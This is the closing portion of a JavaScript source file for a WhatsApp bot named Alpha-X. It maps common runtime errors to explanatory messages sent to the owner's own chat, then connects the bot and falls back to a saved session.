                                    '\n_♦ This error log may include your number or the number of an opponent. Please be careful with it!_' +
                                    '\n_🏷 Aslo you can join our support group:_ \n *https://chat.whatsapp.com/ItIRSBUMN9t2lQzCpfAKWt* ' +
                                    '\n_This message should have gone to your number (saved messages)._\n\n' +
                                    '*Error:* ```' + error + '```\n\n'
                                    , MessageType.text, {detectLinks: false}
                                );
                                if (error.message.includes('URL')) {
                                    return await AlphaxCN.sendMessage(AlphaxCN.user.jid, '*🔭 ᴇʀʀᴏʀ ᴀɴᴀʟʏsɪs [ Ａｌｐｈａ-Ｘ ] 📊*\n\n' + 
                                        '\n========== _Error Resolved!_ ==========' +
                                        '\n\n*🛠 Main Error:* _Only Absolutely URLs Supported_' +
                                        '\n*⚖️ Reason:* _The usage of media tools (xmedia, sticker..) in the LOG number._' +
                                        '\n*🛡️ Solution:* _You can use commands in any chat, except the LOG number._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await AlphaxCN.sendMessage(AlphaxCN.user.jid, '*🔭 ᴇʀʀᴏʀ ᴀɴᴀʟʏsɪs [ Ａｌｐｈａ-Ｘ ] 📊*\n' + 
                                        '\n========== _Error Resolved!_ ==========' +
                                        '\n\n*🛠 Main Error:* _Deleting Plugin_' +
                                        '\n*⚖️ Reason:* _Entering incorrectly the name of the plugin wanted to be deleted._' +
                                        '\n*🛡️ Solution:* _Please try without adding_ *__* _to the plugin you want to delete. If you still get an error, try to add like_ ```?(.*) / $``` _to the end of the name._ '
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await AlphaxCN.sendMessage(AlphaxCN.user.jid, '*🔭 ᴇʀʀᴏʀ ᴀɴᴀʟʏsɪs [ Ａｌｐｈａ-Ｘ ] 📊*\n' + 
                                        '\n========== _Error Resolved!_ ==========' +
                                        '\n\n*🛠 Main Error:* _Split of Undefined_' +
                                        '\n*⚖️ Reason:* _Commands that can be used by group admins occasionally dont see the split function._ ' +
                                        '\n*🛡️ Solution:* _Restarting will be enough._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await AlphaxCN.sendMessage(AlphaxCN.user.jid, '*🔭 ᴇʀʀᴏʀ ᴀɴᴀʟʏsɪs [ Ａｌｐｈａ-Ｘ ] 📊*\n' + 
                                        '\n========== _Error Resolved!_ ==========' +
                                        '\n\n*🛠 Main Error:* _SQL Database Error_' +
                                        '\n*⚖️ Reason:* _Database corruption._ ' +
                                        '\n*🛡️ Solution:* _There is no known solution. You can try reinstalling it._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await AlphaxCN.sendMessage(AlphaxCN.user.jid, '*🔭 ᴇʀʀᴏʀ ᴀɴᴀʟʏsɪs [ Ａｌｐｈａ-Ｘ ] 📊*\n' + 
                                        '\n========== _Error Resolved!_ ==========' +
                                        '\n\n*🛠 Main Error:* _Ookla Server Connection_' +
                                        '\n*⚖️ Reason:* _Speedtest data cannot be transmitted to the server._' +
                                        '\n*🛡️ Solution:* _If you use it one more time the problem will be solved._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await AlphaxCN.sendMessage(AlphaxCN.user.jid, '*🔭 ᴇʀʀᴏʀ ᴀɴᴀʟʏsɪs [ Ａｌｐｈａ-Ｘ ] 📊*\n' + 
                                        '\n========== _Error Resolved!_ ==========' +
                                        '\n\n*🛠 Main Error:* _Requested Audio Params_' +
                                        '\n*⚖️ Reason:* _Using the TTS command outside the Latin alphabet._' +
                                        '\n*🛡️ Solution:* _The problem will be solved if you use the command in Latin letters frame._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await AlphaxCN.sendMessage(AlphaxCN.user.jid, '*🔭 ᴇʀʀᴏʀ ᴀɴᴀʟʏsɪs [ Ａｌｐｈａ-Ｘ ] 📊*\n' + 
                                        '\n========== ```Error Resolved``` ==========' +
                                        '\n\n*🛠 Main Error:* _No Such File or Directory_' +
                                        '\n*⚖️ Reason:* _Incorrect coding of the plugin._' +
                                        '\n*🛡️ Solution:* _Please check the your plugin codes._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await AlphaxCN.sendMessage(AlphaxCN.user.jid, '*🔭 ᴇʀʀᴏʀ ᴀɴᴀʟʏsɪs [ Ａｌｐｈａ-Ｘ ] 📊*\n' + 
                                        '\n========== _Error Resolved!_ ==========' +
                                        '\n\n*🛠 Main Error:* _Error 404 HTTPS_' +
                                        '\n*⚖️ Reason:* _Failure to communicate with the server as a result of using the commands under the Heroku plugin._' +
                                        '\n*🛡️ Solution:* _Wait a while and try again. If you still get the error, perform the transaction on the website.._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await AlphaxCN.sendMessage(AlphaxCN.user.jid, '*🔭 ᴇʀʀᴏʀ ᴀɴᴀʟʏsɪs [ Ａｌｐｈａ-Ｘ ] 📊*\n' + 
                                        '\n========== _Error Resolved!_ ==========' +
                                        '\n\n*🛠 Main Error:* _Reply Delete Function_' +
                                        '\n*⚖️ Reason:* _Using IMG or Wiki commands._' +
                                        '\n*🛡️ Solution:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await AlphaxCN.sendMessage(AlphaxCN.user.jid, '*🔭 ᴇʀʀᴏʀ ᴀɴᴀʟʏsɪs [ Ａｌｐｈａ-Ｘ ] 📊*\n' + 
                                        '\n========== _Error Resolved!_ ==========' +
                                        '\n\n*🛠 Main Error:* _Reply Delete Function_' +
                                        '\n*⚖️ Reason:* _Using IMG or Wiki commands._' +
                                        '\n*🛡️ Solution:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await AlphaxCN.sendMessage(AlphaxCN.user.jid, '*🔭 ᴇʀʀᴏʀ ᴀɴᴀʟʏsɪs [ Ａｌｐｈａ-Ｘ ] 📊*\n' + 
                                        '\n========== _Error Resolved!_ ==========' +
                                        '\n\n*🛠 Main Error:* _Bailyes Action Error_ ' +
                                        '\n*⚖️ Reason:* _The exact reason is unknown. More than one option may have triggered this error._' +
                                        '\n*🛡️ Solution:* _If you use it again, it may improve. If the error continues, you can try to restart._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await AlphaxCN.sendMessage(AlphaxCN.user.jid, '*🔭 ᴇʀʀᴏʀ ᴀɴᴀʟʏsɪs [ Ａｌｐｈａ-Ｘ ] 📊*\n' + 
                                        '\n========== _Error Resolved!_ ==========' +
                                        '\n\n*🛠 Main Error:* _Cannot Decode Text or Media_' +

                                        '\n*⚖️ Reason:* _Incorrect use of the plug._' +
                                        '\n*🛡️ Solution:* _Please use the commands as written in the plugin description._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await AlphaxCN.sendMessage(AlphaxCN.user.jid, '*🔭 ᴇʀʀᴏʀ ᴀɴᴀʟʏsɪs [ Ａｌｐｈａ-Ｘ ] 📊*\n' + 
                                        '\n========== _Error Resolved!_ ==========' +
                                        '\n\n*🛠 Main Error:* _Word Character Usage_' +
                                        '\n*⚖️ Reason:* _Using commands such as TTP, ATTP outside the Latin alphabet._' +
                                        '\n*🛡️ Solution:* _The problem will be solved if you use the command in Latin alphabet.._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await AlphaxCN.sendMessage(AlphaxCN.user.jid, '*🙇🏻 Sorry, I Couldnt Read This Error! 🙇🏻*' +
                                        '\n_You can write to our support group for more help._'
                                        , MessageType.text
                                    );
                                }    
                            }
                        }
                    }
                }
            }
        )
    });
    // ==================== End Error Message ====================

    try {
        await AlphaxCN.connect();
    } catch {
        if (!nodb) {
            console.log(chalk.red.bold('Loading Old Version Session...'))
            AlphaxCN.loadAuthInfo(Session.deCrypt(config.SESSION)); 
            try {
                await AlphaxCN.connect();
            } catch {
                return;
            }
        }
    }
}

AlphaxBot();
